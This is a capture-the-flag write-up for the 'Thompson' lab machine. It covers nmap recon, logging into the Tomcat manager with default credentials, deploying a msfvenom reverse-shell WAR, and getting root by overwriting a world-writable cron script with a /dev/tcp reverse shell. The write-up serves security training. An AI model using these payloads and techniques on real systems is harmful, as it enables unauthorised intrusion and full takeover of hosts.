## 🧾 Overview
Thompson\
boot2root machine for FIT and bsides guatemala CTF

## 🔍 Recon
Let's start with basic scan:
```bash
nmap -A 10.10.183.147            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 17:07 +06
Nmap scan report for 10.10.183.147
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 🔍 Port Analysis
**● Port 8009 AJP13 (Apache JServ Protocol v1.3)**\
It acts as a connector between a web server (like Apache HTTPD) and an application server (typically Apache Tomcat). It allows the web server to forward requests to Tomcat efficiently using a binary protocol.

**● Port 8080 – HTTP (Apache Tomcat)**\
Hosts web applications, often Java-based.

## 🌐 Web Enumeration
I visited port 8080 and found the default page for Apache Tomcat.\
I then visited the manager page, which required authentication. But when I clicked on cancel, I got some interesting juicy info.\
I noticed a message referencing example credentials—specifically tomcat:s3cret, which is one of the known defaults. I tested these credentials, and they successfully granted access to the manager console, which is exactly what I needed to move forward with exploitation.

**● Why manager console?**\
The manager console is needed because it allows uploading .war files, which can be used to execute commands on the server and gain a foothold for further exploitation.

## 🛡️ Vulnerability Analysis
The Tomcat Manager Console was accessible using default credentials (tomcat:s3cret). This interface allows authenticated users to deploy .war files, Java-based web applications—directly to the server. By uploading a malicious .war file containing a reverse shell, we can trigger it via the browser and establish remote access.

This exploit works because Tomcat executes any deployed .war file as part of its web application stack. Once our payload is deployed, Tomcat treats it like a legitimate app, allowing us to interact with it and execute commands on the underlying system.

## 🚀 Exploitation
Looking at the manager console, I found a section called WAR file to deploy. This is our opportunity since we have permission to upload the file.

**● Generating the Payload**\
I used msfvenom to create a .war file containing a reverse shell payload:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
```

**● Setting Up the Listener**\
Before uploading the payload, start a listener :
```bash
nc -lvnp <port>
```
Use the same port as the payload.

**● Uploading and Triggering**\
I uploaded the shell.war file in the Tomcat Manager's deployment section.\
After deploying, the application was accessible at:
```bash
http://<target-ip>:8080/shell/
```
Visiting this URL triggered the reverse shell, and I received a connection back on my listener.

**● Stabilizing the Shell**\
The initial reverse shell was a basic sh session, which lacked features like tab completion and command history. To improve usability, I upgraded it to a fully interactive TTY shell.
1. Spawn a TTY shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
2. Background the shell
```bash
ctrl+z
```
3. Fix terminal settings
```bash
stty raw -echo; fg
```
4. Export TERM variable
```bash
export TERM=xterm
```
This gave me a stable, interactive shell suitable for further enumeration and privilege escalation.

**● User Flag**\
Navigate to the /home/jack directory and you'll find the first flag 🚩.

## 🧑‍💻 Privilege Escalation
After gaining initial access as the tomcat user, I needed to escalate privileges to root. Time to enumerate.

**● Finding the Path**

Looking at cronjob:
```bash
tomcat@ubuntu:/home/jack$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /home/jack && bash id.sh
#
```
I discovered a script named id.sh located in /home/jack. It runs with root privileges on a regular basis, and the file is fully accessible and Jack has read, write, and execute permissions on it. This opens the door for privilege escalation by modifying the script to execute arbitrary commands as root.

1. Identify the target script:\
Found id.sh in /home/jack, confirmed it runs as root and is writable by Jack.
```bash
-rwxrwxrwx 1 jack jack 26 Aug 14  2019 id.sh
```
2. Analyze the script behavior:\
The script pipes the output of the id command into a file named test.txt, located in the same directory. Since the script runs as root, the file is created with root-level permissions.

3. Replace the script with a reverse shell payload:\
Edited id.sh to include a reverse shell command that connects back to your machine.
```bash
echo "bash -i >& /dev/tcp/<ip>/<port> 0>&1" > id.sh
```
4. Set up a listener:\
Started another netcat listener to catch the incoming shell.

5. Wait for execution:\
Since the script runs every minute as root, waited for the next execution cycle.

6. Receive root shell:\
Once triggered, the reverse shell connected back, giving root-level access.
```bash
nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.17.120.190] from (UNKNOWN) [10.10.244.253] 34866
bash: cannot set terminal process group (12059): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/jack# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/home/jack# cat /root/root.txt
cat /root/root.txt
```
You'll get the root flag in /root/root.txt
